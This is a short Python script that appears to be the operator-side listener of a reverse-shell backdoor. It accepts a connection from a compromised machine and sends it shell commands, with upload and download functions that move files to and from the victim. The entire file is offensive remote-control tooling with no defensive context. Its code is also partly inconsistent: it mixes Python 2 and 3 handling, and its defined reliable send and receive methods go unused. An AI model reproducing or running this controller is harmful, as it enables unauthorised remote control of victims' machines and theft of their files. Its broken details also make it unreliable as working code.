
import socket, json, base64, sys

class Listener:
   def __init__(self, ip , port):
      listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      listener.bind((ip, port))
      listener.listen(0)
      print("\n[+] Waiting for incoming connections...\n")
      self.connection, address = listener.accept()
      print("\n[+] Connection established with: " + str(address) + ".\n")

   def reliable_send(self, data):
      json_data = json.dumps(data)
      self.connection.send(json_data)

   def reliable_receive(self):
      json_data = ""
      while True:
         try:
            json_data = json_data + self.connection.recv(1024)
            return json.loads(json_data)
         except ValueError:
            continue 

   def execute(self, cmmd):
      self.connection.send(cmmd)
      if cmmd[0] == "close":
         self.connection.close()
         exit()
      return self.connection.recv(1024)

   def write_file(self, path, data):
      with open(path, 'wb') as f:
         f.write(base64.b64decode(data))
         return "\n[+] Download successful.\n"

   def read_file(self, path):
      with open(path, "rb") as f:
         return base64.b64encode(f.read())

   def run(self):
      while True:
         cmmd = input(">> ")
         cmmd = cmmd.split(" ")


         try:
            if cmmd[0] == "upload":
               file_content = self.read_file(cmmd[1])
               cmmd.append(file_content)

            result = self.execute(cmmd)

            if cmmd[0] == "download" and "[-] Error " not in result:
               result = self.write_file(cmmd[1], result)
         except Exception:
            result = "\n[-] Error during command execution.\n"
            
         print(result)

Listener = Listener(str(sys.argv[1]), int(sys.argv[2]))
Listener.run()
